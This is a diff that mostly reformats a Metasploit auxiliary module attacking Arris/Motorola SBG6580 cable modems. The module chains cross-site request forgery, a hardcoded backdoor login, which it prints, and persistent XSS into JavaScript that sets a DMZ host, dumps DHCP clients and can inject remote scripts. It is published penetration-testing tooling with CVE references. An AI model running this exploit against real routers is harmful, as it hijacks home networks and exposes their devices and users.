@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,88 +7,86 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Arris / Motorola Surfboard SBG6580 Web Interface Takeover',
-      'Description'    => %q{
+                      'Name'           => 'Arris / Motorola Surfboard SBG6580 Web Interface Takeover',
+                      'Description'    => %q(
 
-        The web interface for the Arris / Motorola Surfboard SBG6580 has
-        several vulnerabilities that, when combined, allow an arbitrary website to take
-        control of the modem, even if the user is not currently logged in. The attacker
-        must successfully know, or guess, the target's internal gateway IP address.
-        This is usually a default value of 192.168.0.1.
+                        The web interface for the Arris / Motorola Surfboard SBG6580 has
+                        several vulnerabilities that, when combined, allow an arbitrary website to take
+                        control of the modem, even if the user is not currently logged in. The attacker
+                        must successfully know, or guess, the target's internal gateway IP address.
+                        This is usually a default value of 192.168.0.1.
 
-        First, a hardcoded backdoor account was discovered in the source code
-        of one device with the credentials "technician/yZgO8Bvj". Due to lack of CSRF
-        in the device's login form, these credentials - along with the default
-        "admin/motorola" - can be sent to the device by an arbitrary website, thus
-        inadvertently logging the user into the router.
+                        First, a hardcoded backdoor account was discovered in the source code
+                        of one device with the credentials "technician/yZgO8Bvj". Due to lack of CSRF
+                        in the device's login form, these credentials - along with the default
+                        "admin/motorola" - can be sent to the device by an arbitrary website, thus
+                        inadvertently logging the user into the router.
 
-        Once successfully logged in, a persistent XSS vulnerability is
-        exploited in the firewall configuration page. This allows injection of
-        Javascript that can perform any available action in the router interface.
+                        Once successfully logged in, a persistent XSS vulnerability is
+                        exploited in the firewall configuration page. This allows injection of
+                        Javascript that can perform any available action in the router interface.
 
-        The following firmware versions have been tested as vulnerable:
+                        The following firmware versions have been tested as vulnerable:
 
-        SBG6580-6.5.2.0-GA-06-077-NOSH, and
-        SBG6580-8.6.1.0-GA-04-098-NOSH
+                        SBG6580-6.5.2.0-GA-06-077-NOSH, and
+                        SBG6580-8.6.1.0-GA-04-098-NOSH
 
-      },
-      'Author'         => [ 'joev' ],
-      'DisclosureDate' => 'Apr 08 2015',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [ [ 'WebServer' ] ],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer',
-      'References' => [
-        [ 'CVE', '2015-0964' ], # XSS vulnerability
-        [ 'CVE', '2015-0965' ], # CSRF vulnerability
-        [ 'CVE', '2015-0966' ], # "techician/yZgO8Bvj" web interface backdoor
-        [ 'URL', 'https://community.rapid7.com/community/infosec/blog/2015/06/05/r7-2015-01-csrf-backdoor-and-persistent-xss-on-arris-motorola-cable-modems' ],
-      ]
-    ))
+                      ),
+                      'Author'         => [ 'joev' ],
+                      'DisclosureDate' => 'Apr 08 2015',
+                      'License'        => MSF_LICENSE,
+                      'Actions'        => [ [ 'WebServer' ] ],
+                      'PassiveActions' => [ 'WebServer' ],
+                      'DefaultAction'  => 'WebServer',
+                      'References' => [
+                        [ 'CVE', '2015-0964' ], # XSS vulnerability
+                        [ 'CVE', '2015-0965' ], # CSRF vulnerability
+                        [ 'CVE', '2015-0966' ], # "techician/yZgO8Bvj" web interface backdoor
+                        [ 'URL', 'https://community.rapid7.com/community/infosec/blog/2015/06/05/r7-2015-01-csrf-backdoor-and-persistent-xss-on-arris-motorola-cable-modems' ]
+                      ]))
 
     register_options([
-      OptString.new('DEVICE_IP', [
-        false,
-        "Internal IP address of the vulnerable device.",
-        '192.168.0.1'
-      ]),
-      OptString.new('LOGINS', [
-        false,
-        "Comma-separated list of user/pass combinations to attempt.",
-        'technician/yZgO8Bvj,admin/motorola'
-      ]),
-      OptBool.new('DUMP_DHCP_LIST', [
-        true,
-        "Dump the MAC, IP, and hostnames of all registered DHCP clients.",
-        true
-      ]),
-      OptInt.new('SET_DMZ_HOST', [
-        false,
-        "The final octet of the IP address to set in the DMZ (1-255).",
-        nil
-      ]),
-      OptString.new('BLOCK_INTERNET_ACCESS', [
-        false,
-        "Comma-separated list of IP addresses to block internet access for.",
-        ''
-      ]),
-      OptString.new('CUSTOM_JS', [
-        false,
-        "A string of javascript to execute in the context of the device web interface.",
-        ''
-      ]),
-      OptString.new('REMOTE_JS', [
-        false,
-        "A URL to inject into a script tag in the context of the device web interface.",
-        ''
-      ])
-    ], self.class)
+                       OptString.new('DEVICE_IP', [
+                                       false,
+                                       "Internal IP address of the vulnerable device.",
+                                       '192.168.0.1'
+                                     ]),
+                       OptString.new('LOGINS', [
+                                       false,
+                                       "Comma-separated list of user/pass combinations to attempt.",
+                                       'technician/yZgO8Bvj,admin/motorola'
+                                     ]),
+                       OptBool.new('DUMP_DHCP_LIST', [
+                                     true,
+                                     "Dump the MAC, IP, and hostnames of all registered DHCP clients.",
+                                     true
+                                   ]),
+                       OptInt.new('SET_DMZ_HOST', [
+                                    false,
+                                    "The final octet of the IP address to set in the DMZ (1-255).",
+                                    nil
+                                  ]),
+                       OptString.new('BLOCK_INTERNET_ACCESS', [
+                                       false,
+                                       "Comma-separated list of IP addresses to block internet access for.",
+                                       ''
+                                     ]),
+                       OptString.new('CUSTOM_JS', [
+                                       false,
+                                       "A string of javascript to execute in the context of the device web interface.",
+                                       ''
+                                     ]),
+                       OptString.new('REMOTE_JS', [
+                                       false,
+                                       "A URL to inject into a script tag in the context of the device web interface.",
+                                       ''
+                                     ])
+                     ], self.class)
   end
 
   def run
@@ -119,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def set_dmz_host_js
     return '' unless datastore['SET_DMZ_HOST'].present?
-    %Q|
+    %|
       var x = new XMLHttpRequest;
       x.open('POST', '/goform/RgDmzHost.pl');
       x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
@@ -130,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def dump_dhcp_list_js
     return '' unless datastore['DUMP_DHCP_LIST']
-    %Q|
+    %|
       var f = document.createElement('iframe');
       f.src = '/RgDhcp.asp';
       f.onload = function() {
@@ -189,7 +188,7 @@ window.onmessage = function(e) {
   }
 }
 
-var js = (#{JSON.generate({ js: exploit_js })}).js;
+var js = (#{JSON.generate(js: exploit_js)}).js;
 
 var HIDDEN_STYLE =
   'position:absolute;left:-9999px;top:-9999px;';
@@ -291,7 +290,7 @@ function exploit(hosts, logins) {
   }
 }
 
-var logins = (#{JSON.generate({ logins: datastore['LOGINS'] })}).logins;
+var logins = (#{JSON.generate(logins: datastore['LOGINS'])}).logins;
 var combos = logins.split(',');
 var splits = [], s = '';
 for (var i in combos) {
